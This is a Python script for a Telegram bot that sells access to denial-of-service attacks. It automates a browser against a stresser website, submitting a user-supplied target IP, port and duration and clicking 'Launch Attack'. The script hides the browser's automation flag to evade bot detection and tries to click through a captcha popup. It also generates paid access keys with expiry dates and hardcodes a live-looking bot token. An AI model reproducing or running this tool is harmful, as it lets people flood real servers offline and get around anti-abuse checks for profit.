import asyncio
import json
import time
import random
import string
import sys
from datetime import datetime, timedelta

from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Windows fix
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

# ==================== CONFIG ====================
TOKEN = "7722378149:AAHAt5r2817BoPGap2dpKvTuiGNLx4TWS2A"  # TERA TOKEN
OWNER_ID = 5879359815  # TERA ID

DB_FILE = "db.json"

# Global variables
browser = None
page = None
attack_running = False
attack_end_time = 0

# ==================== DATABASE ====================
def load_db():
    try:
        with open(DB_FILE) as f:
            return json.load(f)
    except:
        return {"keys": {}, "users": {}}

def save_db():
    with open(DB_FILE, "w") as f:
        json.dump(db, f)

db = load_db()

# ==================== BROWSER SETUP ====================
async def start_browser():
    global browser, page
    
    print("🚀 Starting browser...")
    playwright = await async_playwright().start()
    
    browser = await playwright.chromium.launch(
        headless=False,  # False rakh (debugging easy)
        args=[
            '--disable-blink-features=AutomationControlled',
            '--disable-dev-shm-usage',
        ]
    )
    
    page = await browser.new_page()
    
    # Remove webdriver detection
    await page.add_init_script("""
        Object.defineProperty(navigator, 'webdriver', {
            get: () => undefined
        });
    """)
    
    # Go to site
    await page.goto("https://satellitestress.st/attack")
    print("✅ Browser ready!")
    await asyncio.sleep(2)

# ==================== UTILS ====================
def gen_key(days):
    rand = ''.join(random.choices(string.digits, k=8))
    key = f"KING-OF-GOD{rand}"
    expire = (datetime.now() + timedelta(days=days)).timestamp()
    db["keys"][key] = expire
    save_db()
    return key

def authorised(user_id):
    user_id = str(user_id)
    if user_id not in db["users"]:
        return False
    if time.time() > db["users"][user_id]:
        del db["users"][user_id]
        save_db()
        return False
    return True

# ==================== ATTACK FUNCTION ====================
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running, attack_end_time, page
    
    if not authorised(update.effective_user.id):
        return await update.message.reply_text("❌ Not authorised")
    
    if attack_running:
        return await update.message.reply_text("⚠️ Attack already running")
    
    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])
        
        if duration > 300:
            return await update.message.reply_text("Max 300 seconds")
        
        msg = await update.message.reply_text("🚀 Starting attack...")
        
        # STEP 1: Form fill
        await msg.edit_text("📝 Filling form...")
        await page.get_by_role("textbox", name="104.29.138.132").fill(ip)
        await page.get_by_role("textbox", name="80").fill(port)
        await page.get_by_role("textbox", name="60").fill(str(duration))
        await asyncio.sleep(1)
        
        # STEP 2: Click Launch
        await msg.edit_text("🚀 Clicking Launch...")
        await page.get_by_role("button", name="Launch Attack").click()
        await asyncio.sleep(2)
        
        # STEP 3: 🔥 HANDLE RECAPTCHA POPUP 🔥
        await msg.edit_text("✅ Handling verification...")
        try:
            # Wait for popup
            await page.wait_for_selector('button:has-text("Verify")', timeout=5000)
            await page.locator('button:has-text("Verify & Launch")').click()
            await msg.edit_text("🔓 Captcha solved!")
        except:
            try:
                await page.locator('button:has-text("Verify")').click()
            except:
                await msg.edit_text("⚠️ No popup found, continuing...")
        
        await asyncio.sleep(3)
        
        # STEP 4: Confirm attack
        attack_running = True
        attack_end_time = time.time() + duration
        
        await msg.edit_text(
            f"""✅ **ATTACK STARTED**

**Target:** `{ip}:{port}`
**Duration:** `{duration}s`

⏱️ Auto stops after {duration}s
📊 Use /status to check
🛑 /stop will only stop bot (site continues)""",
            parse_mode='Markdown'
        )
        
        # Auto cleanup after duration
        await asyncio.sleep(duration)
        attack_running = False
        await msg.edit_text(
            f"""✅ **ATTACK COMPLETED**

**Target:** `{ip}:{port}`
**Duration:** `{duration}s`
**Status:** Finished""",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}\n\nUsage: /attack ip port time")

# ==================== COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Welcome to Attack Bot**\n\n"
        "🚀 /attack `<ip>` `<port>` `<time>`\n"
        "📊 /status - Check attack\n"
        "🛑 /stop - Stop in bot\n"
        "🔑 /redeem `<key>` - Activate"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not attack_running:
        return await update.message.reply_text("📊 No active attack")
    
    remaining = int(attack_end_time - time.time())
    await update.message.reply_text(f"⚔️ Attack running\n⏱️ Remaining: {remaining}s")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    if attack_running:
        attack_running = False
        await update.message.reply_text(
            "🛑 **Attack stopped in bot**\n"
            "⚠️ Site par chalta rahega duration complete hone tak"
        )
    else:
        await update.message.reply_text("📊 No active attack")

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Owner only")
    
    try:
        days = int(context.args[0])
        key = gen_key(days)
        await update.message.reply_text(f"✅ Key: `{key}`\nDays: {days}")
    except:
        await update.message.reply_text("Usage: /gen days")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        key = context.args[0]
        if key not in db["keys"]:
            return await update.message.reply_text("❌ Invalid key")
        
        expire = db["keys"][key]
        user = str(update.effective_user.id)
        db["users"][user] = expire
        del db["keys"][key]
        save_db()
        
        days = int((expire - time.time()) / 86400)
        await update.message.reply_text(f"✅ Access activated!\nValid: {days} days")
    except:
        await update.message.reply_text("Usage: /redeem KEY")

async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Owner only")
    
    msg = "👥 **Users:**\n\n"
    for uid, exp in db["users"].items():
        days = int((exp - time.time()) / 86400)
        msg += f"• `{uid}`: {days} days\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def when(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = str(update.effective_user.id)
    if user not in db["users"]:
        return await update.message.reply_text("❌ No active plan")
    
    days = int((db["users"][user] - time.time()) / 86400)
    await update.message.reply_text(f"⏱️ Expires in: {days} days")

# ==================== MAIN ====================
async def main():
    global browser, page
    
    # Start browser
    await start_browser()
    
    # Setup bot
    app = ApplicationBuilder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("when", when))
    
    print("🤖 Bot is running...")
    print(f"👑 Owner ID: {OWNER_ID}")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    # Keep running
    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped!")
    except Exception as e:
        print(f"❌ Error: {e}")